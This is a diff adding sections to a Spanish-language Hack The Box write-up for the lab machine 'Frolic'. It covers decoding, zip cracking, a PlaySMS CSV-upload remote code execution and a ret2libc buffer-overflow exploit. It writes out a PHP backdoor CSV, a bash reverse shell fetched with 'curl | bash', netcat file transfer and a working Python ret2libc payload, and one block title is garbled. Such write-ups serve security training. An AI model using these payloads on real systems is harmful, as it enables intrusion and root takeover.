@@ -198,6 +198,8 @@ Si probamos esas credenciales nos logueamos con éxito, ahora la página muestra
 ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
 ```
 
+### Esoteric Languaje
+
 Esto de primeras parece un lenguaje `esotérico`.
 
 :::important
@@ -223,6 +225,8 @@ Nothing here check /asdiSIAJJ0QWE9JAS
 UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA
 ```
 
+### Base64
+
 Esto parece `Base64`, vamos a decodificarlo:
 
 ```bash wrap=false
@@ -246,6 +250,8 @@ Parece que es un **comprimido**, vamos a intentar descomprimirlo:
 Archive:  data.zip
 [data.zip] index.php password:
 ```
+
+### Zip2john and johntheripper
 
 Parece que está protegido por contraseña, vamos a intentar crackearla con `zip2john`:
 
@@ -271,11 +277,15 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
+### Hex
+
 ```txt wrap=false title='index.php'
 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
 ```
 
 Eso parece `hexadecimal` vamos a decodificarlo:
+
+### Base64
 
 ```bash wrap=false
 ❯ cat index.php | xxd -ps -r
@@ -283,6 +293,7 @@ KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
 KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
 K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi
 ```
+
 
 Y eso es de nuevo `Base 64`:
 
@@ -320,6 +331,8 @@ ID           Response   Lines    Word       Chars       Payload
 000001612:   200        3 L      1 W        11 Ch       "backup" 
 ```
 
+### Playsms
+
 ```txt title='/dev/backup'
 /playsms
 ```
@@ -329,5 +342,329 @@ ID           Response   Lines    Word       Chars       Payload
 Si probamos las credenciales `admin:idkwhatispass` nos podemos loguear.
 
 [Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/148)
+
+## Explotación
+
+Si buscamos vulnerabilidades con `searchsploit`, encontramos la siguiente:
+
+```bash wrap=false
+❯ searchsploit playsms
+------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                        |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                    | php/remote/44598.rb
+PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)                                                                    | php/remote/48335.rb
+PlaySms 0.7 - SQL Injection                                                                                                                           | linux/remote/404.pl
+PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                        | php/webapps/26871.txt
+PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                 | php/webapps/7687.txt
+PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                               | php/webapps/17792.txt
+PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                          | php/webapps/30177.txt
+PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                    | php/webapps/42003.txt
+PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                      | php/webapps/42044.txt
+PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                | php/remote/44599.rb
+PlaySMS 1.4 - Remote Code Execution                                                                                                                   | php/webapps/42038.txt
+PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                                                                            | php/webapps/48199.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+❯ searchsploit -m php/webapps/42044.txt
+  Exploit: PlaySMS 1.4 - 'import.php' Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/42044
+     Path: /usr/share/exploitdb/exploits/php/webapps/42044.txt
+    Codes: CVE-2017-9101
+ Verified: True
+File Type: HTML document, ASCII text
+Copied to: /home/zelpro/HTB/Frolic/42044.txt
+```
+El exploit nos explica que deberemos loguearnos e ir a `http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list`, ahí encontramos una subida de archivos y deberemos subir el siguiente `.csv` malicioso:
+
+```txt wrap=false title="backdoor.csv"
+Name,Mobile,Email,Grup code,Tags
+<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,,,
+```
+
+Nosotros a la hora de mandar la petición la interceptaremos con **burpsuite** y cambiaremos el comando al que queramos ejecutar. En mi caso me montare una `reverse shell` de la siguiente manera:
+
+```html title="index.html"
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.8/443 0>&1
+```
+
+```bash title="Levantamos un servidor HTTP"
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Y simplemente en el `User-Agent` de la petición, ponemos `curl http://10.10.14.8 | bash`:
+
+```bash wrap=false title="Reverse shell"
+www-data@frolic:~/html/playsms$ whoami
+www-data
+www-data@frolic:~/html/playsms$ cat /home/ayush/user.txt 
+68100d949d3b35...
+```
+
+## Escalada de privilegios
+
+Comenzaremos buscando archivos con permisos `SUID`:
+
+```bash wrap=false
+www-data@frolic:~/html/playsms$ find / -perm -4000 -type f 2>/dev/null
+/sbin/mount.cifs
+/bin/mount
+/bin/ping6
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/su
+/bin/ntfs-3g
+/home/ayush/.binary/rop
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+```
+
+### Binary rop
+
+Vemos un `binario` en `/home/ayush/.binary/rop` vamos a traerlo al equipo local con **netcat**:
+
+```bash title="Máquina atacante"
+❯ sudo nc -lvnp 4444 > rop
+listening on [any] 4444 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.111] 42698
+```
+
+```bash title="Máquina víctwww-data@frolic:~/html/playsms$ nc 10.10.14.8 4444 < /home/ayush/.binary/ropima"
+www-data@frolic:~/html/playsms$ nc 10.10.14.8 4444 < /home/ayush/.binary/rop
+```
+
+Su funcionamiento es el siguiente:
+
+```bash
+❯ ./rop test; echo
+[+] Message sent: test
+```
+
+### Checksec
+
+Y esta su seguridad:
+
+```bash
+❯ checksec --file=rop
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	 No	0		2		rop
+```
+
+El `NX Enable` significa que no nos permite ejecutar código de la pila. Por lo que tendremos que buscar otro camino.
+
+### Ret2libc
+
+Se me ocurre recurrir a un `ret2libc` que lo que hace es ejecutar una llamada a nivel de **sistema**.
+
+[Buffer Overflow](./4.png)
+
+En esta ocasión de momento quiero saber cuanta `junk` o basura tengo que introducir hasta sobrescribir el `RET` que es la dirección a la que va a apuntar cuando acabe el programa. Si saturamos el programa con muchas `A` por ejemplo, vemos lo siguiente:
+
+```bash wrap=false
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x177     
+$ebx   : 0xffffcc80  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ecx   : 0x0       
+$edx   : 0x0       
+$esp   : 0xffffcc50  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x08048540  →  <__libc_csu_init+0000> push ebp
+$edi   : 0xf7ffcb60  →  0x00000000
+$eip   : 0x41414141 ("AAAA"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffcc50│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
+0xffffcc54│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc58│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc5c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc60│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc64│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc68│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc6c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x41414141
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "rop", stopped 0x41414141 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+```
+
+El `EIP` que es el `RET` es sobrescrito al igual que el `EBP`. Si nos creamos un patrón con el comando `pattern create` y se lo pasamos al programa podremos calcular el `offset` de estos 2 registros:
+
+```txt title="Patrón"
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+```
+
+```bash wrap=false
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x400     
+$ebx   : 0xffffca00  →  "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
+$ecx   : 0x0       
+$edx   : 0x0       
+$esp   : 0xffffc9d0  →  "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
+$ebp   : 0x6161616d ("maaa"?)
+$esi   : 0x08048540  →  <__libc_csu_init+0000> push ebp
+$edi   : 0xf7ffcb60  →  0x00000000
+$eip   : 0x6161616e ("naaa"?)
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffc9d0│+0x0000: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"	← $esp
+0xffffc9d4│+0x0004: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabca[...]"
+0xffffc9d8│+0x0008: "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
+0xffffc9dc│+0x000c: "raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabea[...]"
+0xffffc9e0│+0x0010: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
+0xffffc9e4│+0x0014: "taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga[...]"
+0xffffc9e8│+0x0018: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
+0xffffc9ec│+0x001c: "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabia[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x6161616e
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "rop", stopped 0x6161616e in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern offset $eip
+[+] Searching for '6e616161'/'6161616e' with period=4
+[+] Found at offset 52 (little-endian search) likely
+```
+
+Nos dice qye hay `52` caracteres para poder sobrescribir el `EIP`. Para comprobarlo haremos lo siguiente:
+
+```bash wrap=false title="Generamos el patrón de prueba"
+❯ python3 -c 'print("A"*52+"B"*4)'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+```
+
+```bash wrap=false
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x38      
+$ebx   : 0xffffcdc0  →  0x00000002
+$ecx   : 0x0       
+$edx   : 0x0       
+$esp   : 0xffffcd90  →  0xffffd000  →  0x00000017
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x08048540  →  <__libc_csu_init+0000> push ebp
+$edi   : 0xf7ffcb60  →  0x00000000
+$eip   : 0x42424242 ("BBBB"?)
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffcd90│+0x0000: 0xffffd000  →  0x00000017	← $esp
+0xffffcd94│+0x0004: 0x00000000
+0xffffcd98│+0x0008: 0x00000000
+0xffffcd9c│+0x000c: 0x00000000
+0xffffcda0│+0x0010: 0xffffcdc0  →  0x00000002
+0xffffcda4│+0x0014: 0xf7f98e14  →  0x00232d0c ("
+                                                -#"?)
+0xffffcda8│+0x0018: 0x00000000
+0xffffcdac│+0x001c: 0xf7d8acc3  →   add esp, 0x10
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "rop", stopped 0x42424242 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+```
+
+Y ahí lo tenemos, una vez aquí vamos a comprobar si está activado el `ASLR` (*Address Space Layout Randomization*), que lo que hace activo es hacer aleatorias las localicaciones de memoria en cada ejecución.
+
+```bash title="Máquina víctima"
+www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space   
+0
+```
+
+Vemos que no está activa esta protección. Con ´ldd´ podremos ver las librerías que usa **rop**:
+
+```bash wrap=false
+www-data@frolic:/home/ayush/.binary$ ldd rop 
+	linux-gate.so.1 =>  (0xb7fda000)
+	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+	/lib/ld-linux.so.2 (0xb7fdb000)
+```
+
+Podemos ver que `libc` está en `0xb7e19000` de manera estable. Ahora con `readelf` podremos leer la **tabla de símbolos** de `libc` y encontrar lo que necesitamos:
+
+```bash wrap=false
+www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@| exit@@"
+   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+```
+
+Con esto encontramos los **offsets** de `exit` y `system`. Buscaremos los de `/bin/sh` con el siguiente comando:
+
+```bash
+www-data@frolic:/tmp$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
+ 15ba0b /bin/sh
+```
+
+Vamos a montarnos un pequeño exploit de **python**:
+
+```python wrap=false
+# Libreria para darle la vuelta a las direcciones (little endian)
+from struct import pack
+
+# Offset hasta RET
+offset = 52
+junk = "A"*offset
+
+# ret2libc -> system_addr + exit_addr + bin_sh_addr
+
+base_libc_address = 0xb7e19000
+
+#www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@| exit@@"
+#   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+#  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+#www-data@frolic:/tmp$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
+# 15ba0b /bin/sh
+
+# Calculamos las direcciones en base a los offests
+system_addr = pack("<I", base_libc_address + 0x0003ada0)
+exit_addr = pack("<I", base_libc_address + 0x0002e9d0)
+bin_sh_addr = pack("<I", base_libc_address + 0x0015ba0b)
+
+payload = junk + system_addr + exit_addr + bin_sh_addr
+
+print(payload)
+```
+
+Y lo ejecutamos:
+
+```bash wrap=false
+www-data@frolic:/tmp$ /home/ayush/.binary/rop $(python exploit.py)
+# whoami
+root
+# cat /root/root.txt
+2c740c76bc5dfb7c0...
+```
+
+[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/158)
 
 ---
